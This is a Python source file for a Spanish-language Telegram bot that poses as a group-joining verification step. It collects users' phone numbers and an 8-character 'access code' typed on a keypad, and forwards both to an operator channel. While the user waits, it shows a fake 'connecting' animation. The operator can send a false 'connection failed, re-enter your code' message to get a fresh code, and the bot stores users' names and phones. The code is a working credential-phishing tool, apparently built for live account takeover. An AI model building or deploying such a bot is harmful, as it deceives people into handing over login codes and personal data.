import os
import json
import html
import asyncio
import logging
from datetime import datetime
from telegram import (
    Update, KeyboardButton, ReplyKeyboardMarkup,
    InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHANNEL_ID = os.getenv("ADMIN_CHANNEL_ID", "").strip()  # p.ej. -1002756519910

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("verify-bot")

UD_PHONE = "phone"
UD_CODE = "code"

PENDING_BY_ADMIN_MSG = {}   # admin_msg_id -> data del caso
PENDING_BY_USER_ID = {}     # telegram_id -> admin_msg_id
WAIT_TASKS = {}             # telegram_id -> asyncio.Task

USERS_FILE = "usuarios_lab.json"
USERS = {}  # "telegram_id" -> {"full_name": ..., "username": ..., "phone": ...}

def load_users():
    global USERS
    if not os.path.exists(USERS_FILE):
        USERS = {}
        return
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            USERS = json.load(f)
    except Exception:
        USERS = {}

def save_users():
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(USERS, f, ensure_ascii=False, indent=2)

def admin_chat_ok(update: Update) -> bool:
    chat = update.effective_chat
    if not chat:
        return False
    return str(chat.id) == ADMIN_CHANNEL_ID

def share_phone_kb():
    btn = KeyboardButton("👉🏻𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎🇨🇺", request_contact=True)
    return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)

def build_keypad(code_str: str):
    rows = [
        [InlineKeyboardButton("A", callback_data="d:A"),
         InlineKeyboardButton("B", callback_data="d:B"),
         InlineKeyboardButton("C", callback_data="d:C")],
        [InlineKeyboardButton("D", callback_data="d:D"),
         InlineKeyboardButton("E", callback_data="d:E"),
         InlineKeyboardButton("F", callback_data="d:F")],
        [InlineKeyboardButton("G", callback_data="d:G"),
         InlineKeyboardButton("H", callback_data="d:H"),
         InlineKeyboardButton("I", callback_data="d:I")],
        [InlineKeyboardButton("J", callback_data="d:J"),
         InlineKeyboardButton("K", callback_data="d:K"),
         InlineKeyboardButton("L", callback_data="d:L")],
        [InlineKeyboardButton("M", callback_data="d:M"),
         InlineKeyboardButton("N", callback_data="d:N"),
         InlineKeyboardButton("O", callback_data="d:O")],
        [InlineKeyboardButton("P", callback_data="d:P"),
         InlineKeyboardButton("Q", callback_data="d:Q"),
         InlineKeyboardButton("R", callback_data="d:R")],
        [InlineKeyboardButton("S", callback_data="d:S"),
         InlineKeyboardButton("T", callback_data="d:T"),
         InlineKeyboardButton("U", callback_data="d:U")],
        [InlineKeyboardButton("V", callback_data="d:V"),
         InlineKeyboardButton("W", callback_data="d:W"),
         InlineKeyboardButton("X", callback_data="d:X")],
        [InlineKeyboardButton("Y", callback_data="d:Y"),
         InlineKeyboardButton("Z", callback_data="d:Z"),
         InlineKeyboardButton("1", callback_data="d:1")],
        [InlineKeyboardButton("2", callback_data="d:2"),
         InlineKeyboardButton("3", callback_data="d:3"),
         InlineKeyboardButton("4", callback_data="d:4")],
        [InlineKeyboardButton("5", callback_data="d:5"),
         InlineKeyboardButton("6", callback_data="d:6"),
         InlineKeyboardButton("7", callback_data="d:7")],
        [InlineKeyboardButton("8", callback_data="d:8"),
         InlineKeyboardButton("9", callback_data="d:9"),
         InlineKeyboardButton("0", callback_data="d:0")],
        [InlineKeyboardButton("← Borrar", callback_data="del"),
         InlineKeyboardButton("✅ Confirmar", callback_data="ok")],
        [InlineKeyboardButton("❌ Cancelar", callback_data="cancel")]
    ]
    progreso = " ".join(list(code_str)) if code_str else "—"
    text = (
        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐭𝐮 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 𝐚𝐜𝐜𝐞𝐬𝐨 𝐝𝐞 8 𝐜𝐚𝐫𝐚𝐜𝐭𝐞𝐫𝐞𝐬.\n\n"
        f"Código: `{progreso}`"
    )
    return text, InlineKeyboardMarkup(rows)

async def animate_wait(bot, chat_id: int, message_id: int, user_id: int):
    frames = [
        "⏳ Conectando.",
        "⏳ Conectando..",
        "⏳ Conectando..."
    ]
    idx = 0
    try:
        while True:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=frames[idx % len(frames)]
            )
            idx += 1
            await asyncio.sleep(1.0)
    except asyncio.CancelledError:
        raise
    except Exception:
        pass
    finally:
        WAIT_TASKS.pop(user_id, None)

def stop_wait_task(user_id: int):
    task = WAIT_TASKS.pop(user_id, None)
    if task:
        task.cancel()

def save_user_data(user, phone: str):
    USERS[str(user.id)] = {
        "full_name": user.full_name or "",
        "username": user.username or "",
        "phone": phone or ""
    }
    save_users()

def get_case_by_reply(update: Update):
    msg = update.message
    if not msg or not msg.reply_to_message:
        return None
    return PENDING_BY_ADMIN_MSG.get(msg.reply_to_message.message_id)

def get_case_by_user_id(user_id: int):
    admin_msg_id = PENDING_BY_USER_ID.get(user_id)
    if not admin_msg_id:
        return None
    return PENDING_BY_ADMIN_MSG.get(admin_msg_id)

def to_unicode_bold(text: str) -> str:
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "0123456789"

    lower_bold = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
    upper_bold = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
    digits_bold = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"

    mp = {}
    for a, b in zip(lower, lower_bold):
        mp[a] = b
    for a, b in zip(upper, upper_bold):
        mp[a] = b
    for a, b in zip(digits, digits_bold):
        mp[a] = b

    out = []
    for ch in text:
        if ch in mp:
            out.append(mp[ch])
        else:
            out.append(html.escape(ch))
    return "".join(out)

def remove_case(case_data: dict):
    if not case_data:
        return
    admin_msg_id = case_data.get("admin_msg_id")
    user_id = case_data.get("user_id")
    if admin_msg_id in PENDING_BY_ADMIN_MSG:
        del PENDING_BY_ADMIN_MSG[admin_msg_id]
    if user_id in PENDING_BY_USER_ID:
        del PENDING_BY_USER_ID[user_id]

def user_link_html(user_id: int, text: str) -> str:
    return f'<a href="tg://user?id={user_id}">{html.escape(text)}</a>'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data[UD_CODE] = ""
    context.user_data.pop(UD_PHONE, None)

    nombre_usuario = update.effective_user.first_name or "usuario"
    caption = (
        f"👋𝐇𝐨𝐥𝐚 {nombre_usuario}\n\n"
        "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫.\n\n"
        "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬.\n\n"
        "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
        "“𝐔𝐍𝐈𝐑𝐌𝐄 𝐀𝐋 𝐆𝐑𝐔𝐏𝐎”"
    )

    start_video = os.getenv("START_VIDEO", "").strip()
    if start_video:
        try:
            await update.message.reply_video(
                video=start_video,
                caption=caption,
                reply_markup=share_phone_kb(),
                parse_mode="Markdown"
            )
            return
        except Exception as e:
            log.exception("No pude enviar el video de inicio: %s", e)

    await update.message.reply_text(
        caption,
        reply_markup=share_phone_kb(),
        parse_mode="Markdown"
    )

async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.contact:
        return

    phone = msg.contact.phone_number
    user = update.effective_user

    context.user_data[UD_PHONE] = phone
    context.user_data[UD_CODE] = ""

    save_user_data(user, phone)

    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    admin_text = (
        "📥 *Nuevo número recibido*\n"
        f"- Teléfono: `{phone}`\n"
        f"- Usuario: @{user.username or 'sin_username'} (id {user.id})\n"
        f"- Fecha/Hora: {stamp}"
    )
    try:
        if ADMIN_CHANNEL_ID:
            await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
            log.info("Número enviado al destino %s", ADMIN_CHANNEL_ID)
    except Exception as e:
        log.exception("Error enviando número al destino: %s", e)

    text, kb = build_keypad("")
    await msg.reply_text(text, reply_markup=kb, parse_mode="Markdown")

async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    code = context.user_data.get(UD_CODE, "")
    data = q.data or ""

    if data.startswith("d:") and len(code) < 8:
        code += data.split(":")[1]
    elif data == "del":
        code = code[:-1]
    elif data == "cancel":
        context.user_data[UD_CODE] = ""
        await q.edit_message_text("Operación cancelada. Usa /start para reintentarlo.")
        return
    elif data == "ok":
        if not (len(code) == 8 and code.isalnum()):
            context.user_data[UD_CODE] = ""
            error_msg = (
                "❌ Código inválido\n\n"
                "Asegúrate de ingresar tu código de acceso correcto de 8 caracteres y luego presiona:\n\n"
                "✅ Confirmar.\n\n"
                "Código: `—`"
            )
            text, kb = build_keypad("")
            await q.edit_message_text(error_msg, parse_mode="Markdown", reply_markup=kb)
            return

        phone = context.user_data.get(UD_PHONE, "desconocido")
        user = update.effective_user
        stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        admin_text = (
            "🧩 *Intento de acceso al laboratorio*\n\n"
            f"Teléfono: `{phone}`\n"
            f"Usuario: @{user.username or 'sin_username'}\n"
            f"ID: `{user.id}`\n"
            f"Código ingresado: `{code}`\n"
            f"Hora: {stamp}\n\n"
            "Responde a este mensaje con:\n"
            "`/ok Mensaje para el usuario`\n"
            "o con:\n"
            "`/error`\n\n"
            "También puedes usar:\n"
            f"`/ok {user.id} Mensaje para el usuario`\n"
            f"`/error {user.id}`"
        )

        admin_msg = None
        try:
            if ADMIN_CHANNEL_ID:
                admin_msg = await context.bot.send_message(
                    ADMIN_CHANNEL_ID,
                    admin_text,
                    parse_mode="Markdown"
                )
                log.info("Caso enviado al destino %s", ADMIN_CHANNEL_ID)
        except Exception as e:
            log.exception("Error enviando caso al destino: %s", e)

        await q.edit_message_text("⏳ Conectando...")

        stop_wait_task(user.id)
        WAIT_TASKS[user.id] = asyncio.create_task(
            animate_wait(context.bot, q.message.chat_id, q.message.message_id, user.id)
        )

        if admin_msg:
            case_data = {
                "admin_msg_id": admin_msg.message_id,
                "user_chat_id": q.message.chat_id,
                "wait_message_id": q.message.message_id,
                "phone": phone,
                "code": code,
                "user_id": user.id,
                "full_name": user.full_name or "",
                "username": user.username or ""
            }
            PENDING_BY_ADMIN_MSG[admin_msg.message_id] = case_data
            PENDING_BY_USER_ID[user.id] = admin_msg.message_id

        context.user_data[UD_CODE] = ""
        return

    context.user_data[UD_CODE] = code
    text, kb = build_keypad(code)
    try:
        await q.edit_message_text(text, reply_markup=kb, parse_mode="Markdown")
    except Exception:
        await q.message.edit_reply_markup(reply_markup=kb)

async def ok_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    case_data = get_case_by_reply(update)

    if case_data:
        custom_text = " ".join(context.args).strip()
        if not custom_text:
            await msg.reply_text("Uso respondiendo al caso: /ok Mensaje para el usuario")
            return
    else:
        if len(context.args) < 2:
            await msg.reply_text("Uso: /ok telegram_id Mensaje para el usuario")
            return
        try:
            target_user_id = int(context.args[0])
        except Exception:
            await msg.reply_text("Error: telegram_id inválido.")
            return
        case_data = get_case_by_user_id(target_user_id)
        if not case_data:
            await msg.reply_text("No encontré un caso pendiente para ese telegram_id.")
            return
        custom_text = " ".join(context.args[1:]).strip()

    stop_wait_task(case_data["user_id"])

    try:
        await context.bot.edit_message_text(
            chat_id=case_data["user_chat_id"],
            message_id=case_data["wait_message_id"],
            text=custom_text
        )
    except Exception:
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=custom_text
        )

    remove_case(case_data)
    await msg.reply_text("✅ Usuario actualizado correctamente.")

async def error_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    msg = update.message
    case_data = get_case_by_reply(update)

    if not case_data:
        if len(context.args) != 1:
            await msg.reply_text("Uso respondiendo al caso: /error\nO uso directo: /error telegram_id")
            return
        try:
            target_user_id = int(context.args[0])
        except Exception:
            await msg.reply_text("Error: telegram_id inválido.")
            return
        case_data = get_case_by_user_id(target_user_id)
        if not case_data:
            await msg.reply_text("No encontré un caso pendiente para ese telegram_id.")
            return

    stop_wait_task(case_data["user_id"])

    error_text = (
        "❌ La conexión fue fallida por mala conexión.\n\n"
        "Por favor, vuelve a introducir tu código de acceso."
    )
    text, kb = build_keypad("")

    try:
        await context.bot.edit_message_text(
            chat_id=case_data["user_chat_id"],
            message_id=case_data["wait_message_id"],
            text=error_text,
            parse_mode="Markdown"
        )
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )
    except Exception:
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=error_text,
            parse_mode="Markdown"
        )
        await context.bot.send_message(
            chat_id=case_data["user_chat_id"],
            text=text,
            reply_markup=kb,
            parse_mode="Markdown"
        )

    remove_case(case_data)
    await msg.reply_text("⚠️ Error enviado al usuario y teclado restaurado.")

async def chat_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if len(context.args) < 2:
        await update.message.reply_text("Uso: /chat telegram_id mensaje")
        return

    try:
        target_user_id = int(context.args[0])
    except Exception:
        await update.message.reply_text("Error: telegram_id inválido.")
        return

    text = " ".join(context.args[1:]).strip()
    if not text:
        await update.message.reply_text("Debes escribir un mensaje.")
        return

    try:
        await context.bot.send_message(chat_id=target_user_id, text=text)
        await update.message.reply_text("✅ Mensaje enviado al DM del usuario.")
    except Exception as e:
        await update.message.reply_text(f"❌ No pude enviar el mensaje: {e}")

async def lista_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not admin_chat_ok(update):
        return

    if not USERS:
        await update.message.reply_text("No hay usuarios guardados todavía.")
        return

    partes = ["<b>📋 Lista de usuarios</b>\n"]
    for uid_str, data in sorted(USERS.items(), key=lambda x: x[1].get("full_name", "").lower()):
        uid = int(uid_str)
        nombre = data.get("full_name") or "Sin nombre"
        username = data.get("username") or "sin_username"
        phone = data.get("phone") or "sin teléfono"

        nombre_click = user_link_html(uid, nombre)
        id_click = user_link_html(uid, uid_str)
        phone_click = user_link_html(uid, phone)

        partes.append(
            f"• Nombre: {nombre_click}\n"
            f"• ID: {id_click}\n"
            f"• Teléfono: {phone_click}\n"
            f"• Username: @{html.escape(username)}\n"
        )

    texto = "\n".join(partes)

    if len(texto) <= 4000:
        await update.message.reply_text(texto, parse_mode="HTML", disable_web_page_preview=True)
        return

    bloque = ""
    for linea in partes:
        if len(bloque) + len(linea) + 1 > 4000:
            await update.message.reply_text(bloque, parse_mode="HTML", disable_web_page_preview=True)
            bloque = ""
        bloque += linea + "\n"
    if bloque:
        await update.message.reply_text(bloque, parse_mode="HTML", disable_web_page_preview=True)

async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat and update.effective_chat.type == "private":
        await update.message.reply_text(
            "⚠️ Eso no es tu número compartido con el botón nativo.\n\n"
            "Por favor toca **📲 𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀** para enviarlo automáticamente.",
            reply_markup=share_phone_kb()
        )

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"chat_id: {update.effective_chat.id}")

async def testsend_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Test: el bot puede enviar aquí.")
        await update.message.reply_text("✅ Test enviado. Revisa el destino.")
    except Exception as e:
        await update.message.reply_text(f"❌ Falló el envío: {e}")
        log.exception("Testsend falló: %s", e)

async def on_startup(app):
    if ADMIN_CHANNEL_ID:
        try:
            await app.bot.send_message(ADMIN_CHANNEL_ID, "🟢 Bot online (inicio exitoso).")
        except Exception as e:
            log.exception("No pude enviar mensaje de arranque: %s", e)

def main():
    if not BOT_TOKEN:
        raise RuntimeError("Falta BOT_TOKEN")

    load_users()

    app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
    app.add_handler(CallbackQueryHandler(keypad_cb))
    app.add_handler(CommandHandler("id", id_cmd))
    app.add_handler(CommandHandler("testsend", testsend_cmd))
    app.add_handler(CommandHandler("ok", ok_cmd))
    app.add_handler(CommandHandler("error", error_cmd))
    app.add_handler(CommandHandler("chat", chat_cmd))
    app.add_handler(CommandHandler("lista", lista_cmd))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))

    app.run_polling()

if __name__ == "__main__":
    main()
